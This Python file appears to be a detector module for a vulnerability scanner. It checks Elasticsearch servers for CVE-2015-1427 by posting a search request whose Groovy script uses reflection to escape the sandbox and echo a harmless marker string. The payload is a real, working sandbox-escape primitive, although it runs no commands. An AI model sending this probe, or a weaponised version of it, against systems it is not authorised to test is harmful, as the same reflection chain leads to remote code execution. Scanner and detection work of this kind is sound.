"""CVE-2015-1427 - Elasticsearch Groovy sandbox escape."""
import urllib.parse
from .base import CVEDetector, CVEResult


class ElasticsearchGroovy(CVEDetector):
    cve_id = "CVE-2015-1427"
    title = "Elasticsearch Groovy Sandbox Escape"
    severity = "critical"
    affected = "Elasticsearch 1.3.0 - 1.4.2"
    tags = ["cve-2015-1427", "elasticsearch", "groovy", "rce"]

    def probe(self, base, baseline_body):
        marker = "cveprobe7x7marker"
        # Minimal probe: Groovy expression returning our marker
        payload = {
            "size": 1,
            "query": {"filtered": {"query": {"match_all": {}}}},
            "script_fields": {
                "test": {
                    "script": (
                        'java.lang.Math.class.forName("java.lang.String")'
                        '.getConstructor([B,java.lang.String]).newInstance'
                        f'("{marker}".getBytes(), "UTF-8")'
                    )
                }
            },
        }
        import json as _json
        url = base + "/_search?pretty"
        status, body = self._post(url, _json.dumps(payload),
                                    headers=["Content-Type: application/json"],
                                    timeout=8)
        if not body:
            return None
        if marker in body and marker not in baseline_body:
            return CVEResult(
                vulnerable=True,
                url=url,
                evidence=f"Groovy expression returned marker '{marker}'",
                detail="Elasticsearch evaluates attacker-provided Groovy -> RCE.",
            )
        return None
